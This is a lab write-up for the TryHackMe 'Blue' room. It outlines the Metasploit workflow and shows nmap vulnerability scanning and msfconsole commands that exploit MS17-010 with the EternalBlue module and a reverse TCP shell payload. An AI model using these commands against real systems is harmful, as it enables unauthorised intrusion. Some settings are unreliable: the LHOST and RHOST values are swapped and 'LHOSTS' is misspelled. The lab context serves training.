# TryHackMe_BLUE

### Overview

Metasploit runs on Unix (including Linux and macOS) and on Windows. The Metasploit Framework can be extended to use add-ons in multiple languages.

The basic steps for exploiting a system using the Framework include.

1. Optionally checking whether the intended target system is vulnerable to an exploit.
2. Choosing and configuring an exploit (code that enters a target system by taking advantage of one of its bugs; about 900 different exploits for Windows, Unix/Linux and macOS systems are included).
3. Choosing and configuring a payload (code that will be executed on the target system upon successful entry; for instance, a remote shell or a VNC server). Metasploit often recommends a payload that should work.
4. Choosing the encoding technique so that hexadecimal opcodes known as "bad characters" are removed from the payload, these characters will cause the exploit to fail.
5. Executing the exploit.

This modular approach – allowing the combination of any exploit with any payload – is the major advantage of the Framework. It facilitates the tasks of attackers, exploit writers and payload writers.

To choose an exploit and payload, some information about the target system is needed, such as operating system version and installed network services. This information can be gleaned with port scanning and TCP/IP stack fingerprinting tools such as Nmap. Vulnerability scanners such as Nessus, and OpenVAS can detect target system vulnerabilities. Metasploit can import vulnerability scanner data and compare the identified vulnerabilities to existing exploit modules for accurate exploitation

### Practice

On TryHackMe there is a room to help users practice learning about metasploit [Link Here](https://tryhackme.com/room/blue)


We start the lab.

#### Recon

We first need to determine what damage is on the target by scanning `nmap`.
> nmap -sV -vv --script vuln <Ip_victim>

*-sV: version detection*

*-vv: shows the level of detail*

*--script vuln: These scripts check for specific known vulnerabilities and generally only report results if they are found*

![image](https://user-images.githubusercontent.com/63194321/147560340-55189387-930b-4605-b37a-dcf07ce1b63b.png)
![image](https://user-images.githubusercontent.com/63194321/147560843-2a1b95d1-cdb7-4256-b106-648f92649805.png)
![image](https://user-images.githubusercontent.com/63194321/147560632-6af1deb1-80a8-4973-94f8-66c6a8358d35.png)

As you can see, we have scanned for a vulnerability `ms17-010` that allows us to be able to remote code execution.

#### Gain Access


After finding an accessible vulnerability, we can use `metasploit` to launch an attack.

**Step1:** Open `metasploit`.
> msfconsole

Interface of `metasploit`:

![image](https://user-images.githubusercontent.com/63194321/147561220-8a4831d7-3f93-42e2-af04-d876d707e783.png)

**Step2:** Look for ways to attack vulnerabilities with known names.
> search <name_vulnerabilities>

![image](https://user-images.githubusercontent.com/63194321/147561451-902938d4-621c-424d-b5b0-3ce64d4aff79.png)

**Step3:** Select the module to conduct the attack.

Here we attack the module `eternalblue`.

*EternalBlue exploits a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol*
> use 0 `or` use exploit/windows/smb/ms17_010_eternalblue

![image](https://user-images.githubusercontent.com/63194321/147561926-15aa4a8a-17a8-4b4c-8ea4-cc3693792e3d.png)

**Step3:** We set the payload so that the module can perform the exploit.
> set LHOSTS <victim_ip>
> 
> set payload windows/x64/shell/reverse_tcp
> 
> set RHOST <attack_ip>

![image](https://user-images.githubusercontent.com/63194321/147562379-850a66b9-f3a3-44be-bf71-68d1def5318b.png)

*`tun0` here is TryHackMe's vpn network.*

**Step5:** Exploit
> exploit `or` run

![image](https://user-images.githubusercontent.com/63194321/147562829-03c1adcf-ea70-46c3-9402-a92299865c94.png)







